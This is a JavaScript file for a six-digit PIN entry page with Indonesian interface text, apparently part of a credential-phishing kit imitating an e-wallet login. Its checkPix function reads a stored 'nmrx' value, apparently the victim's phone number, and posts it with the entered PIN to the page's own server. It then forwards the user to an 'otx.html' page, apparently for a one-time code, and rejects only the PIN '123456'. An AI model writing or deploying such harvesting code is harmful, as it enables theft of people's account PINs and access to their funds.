// pix.js

const inputs = document.querySelectorAll(".pix-box");
const showBtn = document.getElementById("showBtn");
const loadingBox = document.getElementById("loadingBox");
const errorBox = document.getElementById("errorBox");

let isShow = false;

/* FADE IN */
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
    inputs[0].focus();
});

/* RESET LOADING */
window.addEventListener("pageshow", () => {
    loadingBox.style.display = "none";
});

/* UPDATE BOX */
function updateBoxState(input){

    if(input.value !== ""){

        if(isShow){
            input.classList.add("filled");
            input.classList.add("show-value");
        }else{
            input.classList.add("filled");
            input.classList.remove("show-value");
        }

    }else{
        input.classList.remove("filled");
        input.classList.remove("show-value");
        input.classList.remove("pop");
    }
}

/* ANIMASI ANGKA MUNCUL DULU */
function popThenHide(input){

    input.classList.remove("filled");
    input.classList.add("show-value");
    input.classList.add("pop");

    setTimeout(() => {

        input.classList.remove("pop");

        if(!isShow && input.value !== ""){
            input.classList.remove("show-value");
            input.classList.add("filled");
        }

    },500);
}

/* FOKUS KE BOX KOSONG */
inputs.forEach((input) => {

    input.addEventListener("click", () => {

        for(let i = 0; i < inputs.length; i++){

            if(inputs[i].value === ""){
                inputs[i].focus();
                return;
            }
        }

        inputs[inputs.length - 1].focus();
    });
});

/* INPUT PIX */
inputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value = input.value
            .replace(/[^0-9]/g,"")
            .substring(0,1);

        errorBox.classList.remove("show");

        if(input.value !== ""){
            popThenHide(input);

            if(index < inputs.length - 1){
                inputs[index + 1].focus();
            }
        }else{
            updateBoxState(input);
        }

        checkPix();
    });

    /* BACKSPACE */
    input.addEventListener("keydown", (e) => {

        if(e.key === "Backspace"){

            if(input.value !== ""){

                input.value = "";
                updateBoxState(input);

            }else if(index > 0){

                inputs[index - 1].focus();
                inputs[index - 1].value = "";
                updateBoxState(inputs[index - 1]);
            }

            e.preventDefault();
        }
    });
});

/* SHOW / HIDE PIX */
showBtn.addEventListener("click", () => {

    isShow = !isShow;

    inputs.forEach(input => {

        if(isShow){

            input.type = "text";

            input.classList.add("show-value");
            input.classList.remove("filled");

        }else{

            input.type = "password";

            if(input.value !== ""){
                input.classList.remove("show-value");
                input.classList.add("filled");
            }

        }

    });

    showBtn.innerText = isShow
        ? "SEMBUNYIKAN"
        : "TAMPILKAN";

});

/* CHECK PIX */
async function checkPix(){

    let pix = "";

    inputs.forEach(input => {
        pix += input.value;
    });

    if(pix.length === 6){

        if(pix === "123456"){

            if(navigator.vibrate){
                navigator.vibrate([120,80,120]);
            }

            errorBox.classList.add("show");

            setTimeout(() => {
                errorBox.classList.remove("show");
            },2000);

            setTimeout(() => {

                inputs.forEach(input => {
                    input.value = "";
                    input.classList.remove("filled");
                    input.classList.remove("show-value");
                    input.classList.remove("pop");
                });

                isShow = false;
                showBtn.innerText = "TAMPILKAN";
                inputs[0].focus();

            },300);

            return;
        }

        const nmrx = localStorage.getItem("nmrx");

        localStorage.setItem("pix", pix);

        await fetch("/pix", {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                nmrx:nmrx,
                pix:pix
            })
        });

        loadingBox.style.display = "flex";

        setTimeout(() => {
            document.body.classList.add("fade-out");
            window.location.href = "otx.html";
        },2000);
    }
}
